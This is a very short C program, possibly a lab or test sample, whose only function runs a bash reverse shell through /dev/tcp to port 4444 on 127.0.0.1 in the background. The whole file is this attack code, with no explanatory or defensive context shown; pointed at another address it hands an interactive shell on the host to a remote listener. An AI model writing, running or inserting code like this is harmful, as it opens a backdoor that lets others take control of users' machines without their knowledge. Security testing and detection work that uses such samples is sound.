#include <stdio.h>
int main() {
    system("bash -i &> /dev/tcp/127.0.0.1/4444 0>&1 &");
}
